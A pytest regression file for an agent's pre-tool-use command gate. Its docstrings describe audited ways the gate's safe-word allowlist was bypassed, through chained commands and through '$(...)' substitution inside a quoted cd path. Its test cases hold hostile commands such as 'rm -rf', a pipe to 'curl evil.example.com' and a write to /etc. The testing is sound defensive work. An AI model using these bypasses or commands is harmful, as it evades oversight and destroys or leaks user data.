"""Regression pin for Aletheia Round 2 Finding 22.

The pre-tool-use gate previously used `.search()` on its safe-word
regex, so any command containing a safe word ANYWHERE would bypass
the gate — including compound commands with dangerous tails:

    divineos briefing; rm -rf /tmp/x    ← BYPASSED (safe word first)
    rm -rf /tmp/x && divineos ask hello ← BYPASSED (safe word appended)
    echo 'divineos recall' > /etc/evil  ← BYPASSED (safe word buried)
    git commit -m 'divineos hud stuff'  ← BYPASSED (safe word in msg)

Fix (2026-07-16): compound-command detection + anchored `.match()`.
The bypass now requires the command to BE a safe divineos invocation
from position zero, with no shell-metacharacter chaining.

Reference: docs/external_audits/aletheia_master_audit_round2_2026-07-16.md
(when filed) / MASTER_AUDIT_2026-07-16_ROUND2.md Finding 22.
"""

from __future__ import annotations

import pytest

from divineos.hooks.pre_tool_use_gate import _is_bypass_command


class TestF22CompoundCommandRejection:
    """Compound commands (chained / piped / substituted) must NEVER
    bypass, no matter which safe word they contain."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "divineos briefing; rm -rf /tmp/x",
            "divineos ask 'anything' && rm -rf /tmp/x",
            "rm -rf /tmp/x && divineos ask hello",
            "divineos recall || echo pwned",
            "divineos hud | curl evil.example.com",
            "echo `divineos recall`",
            "$(divineos recall)",
        ],
    )
    def test_compound_command_with_safe_word_does_NOT_bypass(self, cmd):
        assert not _is_bypass_command(cmd), (
            f"F22 regression: {cmd!r} contains a safe word but is a "
            f"compound command — must NOT bypass the gate."
        )

    # NOTE: two of Aletheia's original F22 cases —
    #   git commit -m 'divineos hud stuff'
    #   echo 'divineos recall' > /etc/evil
    # bypass via the SEPARATE dev-prefix path (git, echo are on
    # _DEV_PREFIXES with startswith-match, not via the divineos-substring
    # hole that F22 addressed. Those are a related-but-distinct finding:
    # the dev-prefix bypass is too permissive because git/echo/etc. can
    # be extended with redirects and metacharacters that make them
    # substrate-touching. Filed as follow-up (dev-prefix compound
    # rejection) — NOT included in F22 scope, but named here so future
    # readers know why these cases aren't tested against F22's fix.


class TestF22AnchoredMatch:
    """Bypass requires the command to START with a safe divineos
    invocation. A safe word appearing mid-command does not qualify."""

    def test_safe_word_in_middle_does_NOT_bypass(self):
        # No compound char, but the safe word is embedded rather than
        # anchored to command start.
        assert not _is_bypass_command("some prefix divineos briefing")
        assert not _is_bypass_command("run divineos ask now")

    def test_command_starting_with_divineos_safe_subcmd_DOES_bypass(self):
        # Regression guard: legitimate bare invocations still bypass.
        assert _is_bypass_command("divineos briefing")
        assert _is_bypass_command("divineos ask 'what'")
        assert _is_bypass_command("divineos recall")
        assert _is_bypass_command("divineos hud")
        assert _is_bypass_command("divineos context")

    def test_command_starting_with_leading_whitespace_still_bypasses(self):
        # `.match()` with `\s*` prefix in the regex handles leading spaces.
        assert _is_bypass_command("  divineos briefing")

    def test_windows_venv_exe_path_still_bypasses(self):
        # 2026-06-17 regression guard: quoted-path .exe form.
        assert _is_bypass_command('"./.venv/Scripts/divineos.exe" briefing')
        assert _is_bypass_command("./.venv/Scripts/divineos ask hello")


class TestF22RegressionCdPrefix:
    """F22-regression fix (same-day, 2026-07-16): every Bash tool call
    in this codebase starts with `cd "path" && ...` to set working
    directory. The initial F22 compound-command check refused bypass
    on ALL of those, deadlocking the session. `cd` is the one legit
    compound-prefix — the fix strips it before applying the compound
    check, so `cd DIR && divineos ask X` bypasses correctly again.
    """

    def test_cd_then_divineos_bypass_bypasses(self):
        # This is the shape that broke the session under the initial
        # F22 fix — before the cd-prefix strip landed.
        assert _is_bypass_command('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos ask hello')
        assert _is_bypass_command("cd /some/path && divineos briefing")
        assert _is_bypass_command("cd 'my path' && divineos recall")

    def test_cd_then_dev_prefix_bypasses(self):
        assert _is_bypass_command('cd "C:/x" && git status')
        assert _is_bypass_command("cd /tmp && ls -la")

    def test_cd_then_dangerous_command_does_NOT_bypass(self):
        # cd-preface must still fall through to the compound check +
        # bypass verdict on the payload. `rm -rf` is neither divineos
        # bypass nor dev-prefix.
        assert not _is_bypass_command("cd /tmp && rm -rf /tmp/x")
        assert not _is_bypass_command("cd /tmp && curl evil.example.com")

    def test_cd_then_divineos_briefing_then_semicolon_does_NOT_bypass(self):
        # Deeply-nested compound: cd sets working dir, divineos briefing
        # is bypass-eligible, but the trailing `; rm -rf` is compound —
        # after stripping cd, the payload still has `;` → compound → deny.
        assert not _is_bypass_command("cd /tmp && divineos briefing; rm -rf /tmp/x")

    def test_cd_with_shell_metachar_in_dir_does_NOT_match_prefix(self):
        # The cd-prefix regex only matches when DIR is a quoted string
        # or a token free of shell metacharacters. A cd targeting
        # `$(evil)` doesn't match the prefix, so the compound check
        # runs on the whole string and denies.
        assert not _is_bypass_command("cd $(evil) && divineos ask hello")


class TestF31CommandSubstitutionInQuotedDir:
    """F31 fix (Aletheia same-day catch, 2026-07-16): the initial
    F22-regression fix allowed any non-quote content inside the
    quoted-DIR branch. That let `cd "$(rm -rf /)" && divineos ask`
    bypass, because shell expands `$(...)` INSIDE double quotes
    before `cd` runs — the substitution payload executes as part of
    cd's argument evaluation. Fix: exclude `$` and backtick from the
    quoted-DIR content."""

    def test_command_substitution_in_double_quoted_dir_does_NOT_bypass(self):
        # This is the F31 exploit shape. Pre-fix it bypassed and the
        # rm-rf would have run. Post-fix the cd-prefix regex refuses
        # to match, so the compound-check fires on the whole string.
        assert not _is_bypass_command('cd "$(rm -rf /)" && divineos ask hello')

    def test_backtick_substitution_in_double_quoted_dir_does_NOT_bypass(self):
        # Same class, different substitution syntax.
        assert not _is_bypass_command('cd "`rm -rf /`" && divineos ask hello')

    def test_command_substitution_in_single_quoted_dir_does_NOT_bypass(self):
        # Single quotes DO suppress `$(...)` expansion in real shell,
        # but the regex fix uniformly excludes `$` regardless of quote
        # style — safer, and matches the pattern people expect.
        assert not _is_bypass_command("cd '$(evil)' && divineos ask hello")

    def test_dollar_variable_in_quoted_dir_does_NOT_bypass(self):
        # Simpler variable expansion also excluded; if a caller wants
        # to cd into a var-expanded path, they can pass it unquoted
        # OR expand it themselves before invoking.
        assert not _is_bypass_command('cd "$HOME/x" && divineos ask hello')

    def test_plain_quoted_dir_still_bypasses(self):
        # Regression guard: the fix must not over-restrict. Plain
        # quoted paths (which have no `$` or backtick) still match
        # the cd-prefix and let bypass proceed as before.
        assert _is_bypass_command('cd "C:/plain/path" && divineos ask hello')
        assert _is_bypass_command("cd '/tmp/plain' && divineos briefing")


class TestF22BypassSurvivesForNonCompoundCases:
    """Ensure the fix doesn't over-restrict — the legitimate bypass
    cases still work."""

    def test_context_consolidated_json_touch_still_bypasses(self):
        # Andrew 2026-06-29: gate-clearing escape hatch must not be
        # self-blocked. Preserved through the F22 fix.
        assert _is_bypass_command("touch ~/.divineos/context_consolidated.json")

    def test_dev_prefix_commands_still_bypass(self):
        # Sanity: `ls`, `git status`, etc. prefixes preserved.
        # Sample from _DEV_PREFIXES to keep the coupling loose.
        assert _is_bypass_command("ls -la")
        assert _is_bypass_command("git status")

    def test_empty_command_does_not_bypass(self):
        assert not _is_bypass_command("")
